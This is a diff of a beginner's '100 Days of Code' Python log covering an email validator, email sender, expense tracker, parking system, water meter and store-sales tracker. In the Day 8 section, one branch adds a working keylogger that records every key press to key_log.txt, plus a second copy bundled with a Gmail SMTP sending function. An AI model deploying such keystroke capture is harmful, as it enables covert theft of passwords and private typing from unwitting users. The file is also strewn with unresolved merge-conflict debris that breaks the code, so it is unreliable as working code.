@@ -261,7 +261,11 @@ DAY 8
 ### Author: ABDULLAHI AHMED OSMAN
 ### Date: 2025-01-08
 ### Description: This is the eighth day of the 100 Days of Code challenge.
+ my_branch
 ### The task is to create a program that can verify email address 
+=======
+### The task is to create a program that can verify email address and Key Logger
+  Osman--branch
 
 import re
 
@@ -276,20 +280,121 @@ def verify_email(email):
         bool: True if the email address is valid, False otherwise.
     """
     email_regex = r"^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$"
+ my_branch
     try:
         return bool(re.match(email_regex, email))
     except TypeError:
+=======
+    if re.match(email_regex, email):
+        return True
+    else:
+  Osman--branch
         return False
 
 def main():
     # Test the verify_email function
+  my_branch
     emails = ["alpha62@gmail.com.com", "musabihi6563@gmail.com", "test@.com", None, 123]
     for email in emails: 
+=======
+    emails = ["test@example.com", "test.example.com", "test@.com"]
+    for email in emails:
+  Osman--branch
         print(f"Email: {email}, Valid: {verify_email(email)}")
 
 if __name__ == "__main__":
     main()
 
+  my_branch
+=======
+import keyboard
+import time
+import threading
+import logging
+import datetime
+import os
+import platform
+
+# Set up logging
+logging.basicConfig(filename='key_log.txt', level=logging.INFO, format='%(asctime)s: %(message)s')
+
+def on_key_press(event):
+    logging.info(f'Key pressed: {event.name}')
+
+def on_key_release(event):
+    logging.info(f'Key released: {event.name}')
+
+def main():
+    try:
+        keyboard.on_press(on_key_press)
+        keyboard.on_release(on_key_release)
+
+        # Keep the program running until manually stopped
+        while True:
+            time.sleep(1)
+    except KeyboardInterrupt:
+        print('Program stopped manually')
+    except Exception as e:
+        print(f'An error occurred: {e}')
+    finally:
+        keyboard.unhook_all()
+
+if __name__ == "__main__":
+    main()
+
+import os
+import platform
+import time
+import datetime
+import logging
+import threading
+import keyboard
+import re
+import smtplib
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+
+# Set up logging
+logging.basicConfig(filename='key_log.txt', level=logging.INFO, format='%(asctime)s: %(message)s')
+
+def on_key_press(event):
+    logging.info(f'Key pressed: {event.name}')
+
+def on_key_release(event):
+    logging.info(f'Key released: {event.name}')
+
+def send_email(subject, message, from_addr, to_addr, password):
+    msg = MIMEMultipart()
+    msg['From'] = from_addr
+    msg['To'] = to_addr
+    msg['Subject'] = subject
+    msg.attach(MIMEText(message, 'plain'))
+    server = smtplib.SMTP('smtp.gmail.com', 587)
+    server.starttls()
+    server.login(from_addr, password)
+    text = msg.as_string()
+    server.sendmail(from_addr, to_addr, text)
+    server.quit()
+
+def main():
+    try:
+        keyboard.on_press(on_key_press)
+        keyboard.on_release(on_key_release)
+
+        # Keep the program running until manually stopped
+        while True:
+            time.sleep(1)
+    except KeyboardInterrupt:
+        print('Program stopped manually')
+    except Exception as e:
+        print(f'An error occurred: {e}')
+    finally:
+        keyboard.unhook_all()
+
+if __name__ == "__main__":
+    main()
+
+  Osman--branch
  DAY 9
 ===============================
 ### Author: ABDULLAHI AHMED OSMAN
@@ -343,16 +448,44 @@ def main():
 if __name__ == "__main__":
     main()
 
+  my_branch
  DAY 10
 ===============================
 ### Author: ABDULLAHI AHMED OSMAN
 ### Date: 2025-01-10
 ### Description: This is the tenth day of the 100 Days of Code challenge.
+=======
+DAY 10
+===============================
+### Author: ABDULLAHI AHMED OSMAN
+### Date: 2025-01-10
+### Description: This is the ninth day of the 100 Days of Code challenge.
+  Osman--branch
 ### The task is to create a program that can send an email using the provided details.
 ### The program should ask for user input for the subject, message, sender's email address, recipient
 's email address, and sender's email password.
 ### The program should then send an email using the provided details.
+  my_branch
 
+=======
+### The program should handle any exceptions that may occur during the email sending process.
+### The program should print a success message if the email is sent successfully.
+### The program should print an error message if an exception occurs during the email sending process.
+### The program should use the smtplib library to send the email.
+### The program should use the MIMEMultipart class to create a multipart message.
+### The program should use the MIMEText class to create a plain text message.
+### The program should use the starttls method to start a TLS connection with the SMTP server.
+### The program should use the login method to login to the sender's email account.
+### The program should use the sendmail method to send the email.
+### The program should use the quit method to close the SMTP connection.
+### The program should use the keyboard library to listen for keyboard events.
+### The program should use the on_key_press and on_key_release functions to handle keyboard events.
+### The program should use the join method to wait for the keyboard listener to stop.
+### The program should use the finally block to print a message when the program stops.
+### The program should use the if __name__ == "__main__": block to ensure the main
+function is called when the program is run directly.
+python
+ Osman--branch
 import smtplib
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
@@ -405,8 +538,12 @@ DAY 11
 ### Date: 2025-01-11
 ### Description: This is the eleventh day of the 100 Days of Code challenge.
 ### The task is to create a program that allows to track our expenses and income. The program should be able to add, remove, and display expenses and income.
+ my_branch
 ### The program should also be able to calculate the total income and total expenses.
 ### The task is to create a simple expense tracker using Python classes.
+=======
+### The program should also be able to calculate the total income and total expenses
+  Osman--branch
 python
 class ExpenseTracker:
     def __init__(self):
@@ -481,7 +618,12 @@ def main():
 if __name__ == "__main__":
     main()
 
+ my_branch
  DAY 12
+=======
+
+DAY 12
+  Osman--branch
 ==============================
 ### Author: ABDULLAHI AHMED OSMAN
 ### Date: 2025-01-12
@@ -789,7 +931,7 @@ class BankAccount:
         print(f"Account Type: {self.account_type}")
 
 def main():
-    account = BankAccount("1234567890", "John Doe", "johndoe@example.com", "123-456-7890", "123 Main St", "1990-01-01", 33, "Male", "Software Engineer", "Married", "American", "1234567890", "Driver's License", "2020-01-01", "2025-01-01", "DMV", "USA", "California", "Los Angeles", "12345", "123 Main St", "West Coast")
+    account = BankAccount("1234567890", "John Doe", "abdi@example.com", "123-456-7890", "123 Main St", "1990-01-01", 33, "Male", "Software Engineer", "Married", "American", "1234567890", "Driver's License", "2020-01-01", "2025-01-01", "DMV", "USA", "California", "Los Angeles", "12345", "123 Main St", "West Coast")
     while True:
         print("\n1. Deposit")
         print("2. Withdraw")
@@ -818,7 +960,10 @@ def main():
 if __name__ == "__main__":
     main()
 
+  my_branch
 
+=======
+  Osman--branch
 DAY 15
 ================
 ### Author: ABDULLAHI AHMED OSMAN
@@ -882,4 +1027,416 @@ def main():
             print("Invalid choice. Please try again.")
 
 if __name__ == "__main__":
+ my_branch
     main()
+=======
+    main()
+
+  Osman--branch
+
+  DAY 16
+================
+### Author: ABDULLAHI AHMED OSMAN
+### Date: 2025-01-16
+### Description: This is the Sixteenth day of the 100 Days of Code challenge.
+### Description: In this day, I will be learning about Object-Oriented Programming (OOP) in Python.
+### Description: I will be creating a simple parking system using OOP principles.
+### Description: The parking system will have the following features:
+### Description: 1. Parking Lot: This will be the main class that will handle all the
+### Description: parking lot operations.
+### Description: 2. Vehicle: This will be the class that will represent a vehicle.
+### Description: 3. Parking Ticket: This will be the class that will represent a parking ticket
+### Description: 4. Parking Spot: This will be the class that will represent a parking spot
+### Description: The parking system will have the following methods:
+### Description: 1. park_vehicle: This method will park a vehicle in the parking lot.
+### Description: 2. unpark_vehicle: This method will unpark a vehicle from the parking
+### Description: lot.
+### Description: 3. display_parking_lot: This method will display the parking lot
+### Description: 4. display_parking_tickets: This method will display all the parking tickets
+### Description: 5. display_parking_spots: This method will display all the parking spots
+python
+class ParkingLot:
+    def __init__(self):
+        self.parking_spots = []
+        self.parking_tickets = []
+
+    def add_parking_spot(self, spot):
+        self.parking_spots.append(spot)
+
+    def remove_parking_spot(self, spot):
+        if spot in self.parking_spots:
+            self.parking_spots.remove(spot)
+        else:
+            print("Parking spot not found.")
+
+    def park_vehicle(self, vehicle, spot):
+        if spot in self.parking_spots:
+            self.parking_tickets.append(ParkingTicket(vehicle, spot))
+            print(f"Vehicle {vehicle.license_plate} parked in spot {spot.spot_number}.")
+        else:
+            print("Parking spot not available.")
+
+    def unpark_vehicle(self, vehicle):
+        for ticket in self.parking_tickets:
+            if ticket.vehicle == vehicle:
+                self.parking_tickets.remove(ticket)
+                print(f"Vehicle {vehicle.license_plate} unparked.")
+                return
+        print("Vehicle not found in parking lot.")
+
+    def display_parking_lot(self):
+        print("Parking Lot:")
+        for spot in self.parking_spots:
+            print(f"Spot {spot.spot_number}: {spot.spot_type}")
+
+    def display_parking_tickets(self):
+        print("Parking Tickets:")
+        for ticket in self.parking_tickets:
+            print(f"Vehicle {ticket.vehicle.license_plate} parked in spot {ticket.spot.spot_number}.")
+
+    def display_parking_spots(self):
+        print("Parking Spots:")
+        for spot in self.parking_spots:
+            print(f"Spot {spot.spot_number}: {spot.spot_type}")
+
+
+class Vehicle:
+    def __init__(self, license_plate, vehicle_type):
+        self.license_plate = license_plate
+        self.vehicle_type = vehicle_type
+
+
+class ParkingTicket:
+    def __init__(self, vehicle, spot):
+        self.vehicle = vehicle
+        self.spot = spot
+
+
+class ParkingSpot:
+    def __init__(self, spot_number, spot_type):
+        self.spot_number = spot_number
+        self.spot_type = spot_type
+
+
+def main():
+    parking_lot = ParkingLot()
+
+    while True:
+        print("\n1. Add parking spot")
+        print("2. Remove parking spot")
+        print("3. Park vehicle")
+        print("4. Unpark vehicle")
+        print("5. Display parking lot")
+        print("6. Display parking tickets")
+        print("7. Display parking spots")
+        print("8. Quit")
+        choice = input("Enter your choice: ")
+
+        if choice == "1":
+            spot_number = input("Enter parking spot number: ")
+            spot_type = input("Enter parking spot type: ")
+            parking_lot.add_parking_spot(ParkingSpot(spot_number, spot_type))
+        elif choice == "2":
+            spot_number = input("Enter parking spot number: ")
+            parking_lot.remove_parking_spot(ParkingSpot(spot_number, ""))
+        elif choice == "3":
+            license_plate = input("Enter vehicle license plate: ")
+            vehicle_type = input("Enter vehicle type: ")
+            spot_number = input("Enter parking spot number: ")
+            parking_lot.park_vehicle(Vehicle(license_plate, vehicle_type), ParkingSpot(spot_number, ""))
+        elif choice == "4":
+            license_plate = input("Enter vehicle license plate: ")
+            parking_lot.unpark_vehicle(Vehicle(license_plate, ""))
+        elif choice == "5":
+            parking_lot.display_parking_lot()
+        elif choice == "6":
+            parking_lot.display_parking_tickets()
+        elif choice == "7":
+            parking_lot.display_parking_spots()
+        elif choice == "8":
+            break
+        else:
+            print("Invalid choice. Please try again.")
+
+
+if __name__ == "__main__":
+    main()
+
+DAY 17
+=======================
+### Author: ABDULLAHI AHMED OSMAN
+### Date: 2025-01-17
+### Description: This is the  17th day of the 100 Days of Code challenge. 
+### The task is to create a simple water meter
+### that can measure the amount of water used by a household. The meter should be able to track
+### the total amount of water used, the amount of water used today, and the amount of water
+### used yesterday.
+### The meter should also be able to display the current date and time.
+### The meter should be able to display the total amount of water used, the amount of water used
+### today, and the amount of water used yesterday.
+### The meter should be able to display the current date and time.
+### The meter should be able to display the current date and time.
+
+from datetime import datetime
+from datetime import timedelta
+
+class WaterMeter:
+    def __init__(self):
+        self.total_water_used = 0
+        self.water_used_today = 0
+        self.water_used_yesterday = 0
+        self.current_date = datetime.now()
+
+    def add_water_used(self, amount):
+        self.total_water_used += amount
+        self.water_used_today += amount
+
+    def display_info(self):
+        print(f"Current Date and Time: {self.current_date}")
+        print(f"Total Water Used: {self.total_water_used} units")
+        print(f"Water Used Today: {self.water_used_today} units")
+
+    def display_yesterday_water_used(self):
+        print(f"Water Used Yesterday: {self.water_used_yesterday} units")
+
+    def calculate_yesterday_water_used(self):
+        today = datetime.now()
+        if today.date() != self.current_date.date():
+            self.water_used_yesterday = self.water_used_today
+            self.water_used_today = 0
+            self.current_date = today
+
+    def main(self):
+        while True:
+            print("1. Add Water Used")
+            print("2. Display Info")
+            print("3. Display Yesterday's Water Used")
+            print("4. Exit")
+            choice = input("Enter your choice: ")
+            if choice == "1":
+                self.add_water_used(float(input("Enter the amount of water used: ")))
+            elif choice == "2":
+                self.display_info()
+            elif choice == "3":
+                self.calculate_yesterday_water_used()
+                self.display_yesterday_water_used()
+            elif choice == "4":
+                break
+            else:
+                print("Invalid choice. Please try again.")
+
+if __name__ == "__main__":
+    water_meter = WaterMeter()
+    water_meter.main()
+
+DAY 18
+====================
+### Author: ABDULLAHI AHMED OSMAN
+### Date: 2025-01-18
+### Description: This is the  18th day of the 100 Days of Code challenge. 
+### The task is to create a program that simulates a water meter. The program should be able to add water used, display the the amount of fees charged for month.
+
+from datetime import datetime
+
+class WaterMeter:
+    def __init__(self):
+        self.total_water_used = 0
+        self.water_used_monthly = {}
+        self.current_date = datetime.now()
+        self.fees_per_unit = 0.5
+
+    def add_water_used(self, amount):
+        self.total_water_used += amount
+        current_month = self.current_date.strftime("%B")
+        if current_month in self.water_used_monthly:
+            self.water_used_monthly[current_month] += amount
+        else:
+            self.water_used_monthly[current_month] = amount
+
+    def display_info(self):
+        print(f"Current Date and Time: {self.current_date}")
+        print(f"Total Water Used: {self.total_water_used} units")
+
+    def display_monthly_water_used(self):
+        for month, amount in self.water_used_monthly.items():
+            print(f"{month}: {amount} units")
+
+    def calculate_monthly_fees(self):
+        for month, amount in self.water_used_monthly.items():
+            fees = amount * self.fees_per_unit
+            print(f"{month} fees: ${fees:.2f}")
+
+    def main(self):
+        while True:
+            print("1. Add Water Used")
+            print("2. Display Info")
+            print("3. Display Monthly Water Used")
+            print("4. Calculate Monthly Fees")
+            print("5. Exit")
+            choice = input("Enter your choice: ")
+            if choice == "1":
+                self.add_water_used(float(input("Enter the amount of water used: ")))
+            elif choice == "2":
+                self.display_info()
+            elif choice == "3":
+                self.display_monthly_water_used()
+            elif choice == "4":
+                self.calculate_monthly_fees()
+            elif choice == "5":
+                break
+            else:
+                print("Invalid choice. Please try again.")
+
+if __name__ == "__main__":
+    water_meter = WaterMeter()
+    water_meter.main()
+
+DAY 19
+========================
+### Author: ABDULLAHI AHMED OSMAN
+### Date: 2025-01-18
+### Description: This is the  19th day of the 100 Days of Code challenge. 
+### The task is to create a program that displays the amount of product sold by a store. The program should be able to add products, display the total amount of products in one year
+### and calculate the average amount of products sold per day.
+### The program should also be able
+### to display the total amount of products sold in a specific month and the average amount of products sold
+### in a specific month.
+### The program should also be able to display the total amount of products sold in a specific year and the average profit they earn yearly
+### the average amount of products sold in a specific year.
+
+from datetime import datetime
+
+class Product:
+    def __init__(self, name, price, quantity):
+        self.name = name
+        self.price = price
+        self.quantity = quantity
+
+class Store:
+    def __init__(self):
+        self.products = {}
+        self.sales = {}
+
+    def add_product(self, product):
+        self.products[product.name] = product
+
+    def remove_product(self, product_name):
+        if product_name in self.products:
+            del self.products[product_name]
+        else:
+            print("Product not found.")
+
+    def add_sale(self, product_name, quantity, date):
+        if product_name in self.products:
+            if date in self.sales:
+                self.sales[date].append((product_name, quantity))
+            else:
+                self.sales[date] = [(product_name, quantity)]
+        else:
+            print("Product not found.")
+
+    def display_total_sales(self):
+        total_sales = 0
+        for date, sales in self.sales.items():
+            for product_name, quantity in sales:
+                total_sales += self.products[product_name].price * quantity
+        print(f"Total sales: ${total_sales:.2f}")
+
+    def display_average_daily_sales(self):
+        total_sales = 0
+        total_days = len(self.sales)
+        for date, sales in self.sales.items():
+            for product_name, quantity in sales:
+                total_sales += self.products[product_name].price * quantity
+        average_daily_sales = total_sales / total_days
+        print(f"Average daily sales: ${average_daily_sales:.2f}")
+
+    def display_monthly_sales(self, month):
+        monthly_sales = 0
+        for date, sales in self.sales.items():
+            if date.startswith(month):
+                for product_name, quantity in sales:
+                    monthly_sales += self.products[product_name].price * quantity
+        print(f"Monthly sales for {month}: ${monthly_sales:.2f}")
+
+    def display_average_monthly_sales(self, month):
+        monthly_sales = 0
+        total_days = 0
+        for date, sales in self.sales.items():
+            if date.startswith(month):
+                total_days += 1
+                for product_name, quantity in sales:
+                    monthly_sales += self.products[product_name].price * quantity
+        average_monthly_sales = monthly_sales / total_days
+        print(f"Average monthly sales for {month}: ${average_monthly_sales:.2f}")
+
+    def display_yearly_sales(self, year):
+        yearly_sales = 0
+        for date, sales in self.sales.items():
+            if date.startswith(year):
+                for product_name, quantity in sales:
+                    yearly_sales += self.products[product_name].price * quantity
+        print(f"Yearly sales for {year}: ${yearly_sales:.2f}")
+
+    def display_average_yearly_sales(self, year):
+        yearly_sales = 0
+        total_days = 0
+        for date, sales in self.sales.items():
+            if date.startswith(year):
+                total_days += 1
+                for product_name, quantity in sales:
+                    yearly_sales += self.products[product_name].price * quantity
+        average_yearly_sales = yearly_sales / total_days
+        print(f"Average yearly sales for {year}: ${average_yearly_sales:.2f}")
+
+def main():
+    store = Store()
+    while True:
+        print("\n1. Add product")
+        print("2. Remove product")
+        print("3. Add sale")
+        print("4. Display total sales")
+        print("5. Display average daily sales")
+        print("6. Display monthly sales")
+        print("7. Display average monthly sales")
+        print("8. Display yearly sales")
+        print("9. Display average yearly sales")
+        print("10. Quit")
+        choice = input("Enter your choice: ")
+        if choice == "1":
+            name = input("Enter product name: ")
+            price = float(input("Enter product price: "))
+            quantity = int(input("Enter product quantity: "))
+            store.add_product(Product(name, price, quantity))
+        elif choice == "2":
+            name = input("Enter product name: ")
+            store.remove_product(name)
+        elif choice == "3":
+            name = input("Enter product name: ")
+            quantity = int(input("Enter sale quantity: "))
+            date = input("Enter sale date (YYYY-MM-DD): ")
+            store.add_sale(name, quantity, date)
+        elif choice == "4":
+            store.display_total_sales()
+        elif choice == "5":
+            store.display_average_daily_sales()
+        elif choice == "6":
+            month = input("Enter month (YYYY-MM): ")
+            store.display_monthly_sales(month)
+        elif choice == "7":
+            month = input("Enter month (YYYY-MM): ")
+            store.display_average_monthly_sales(month)
+        elif choice == "8":
+            year = input("Enter year (YYYY): ")
+            store.display_yearly_sales(year)
+        elif choice == "9":
+            year = input("Enter year (YYYY): ")
+            store.display_average_yearly_sales(year)
+        elif choice == "10":
+            break
+        else:
+            print("Invalid choice. Please try again.")
+
+if __name__ == "__main__":
+    main()
+
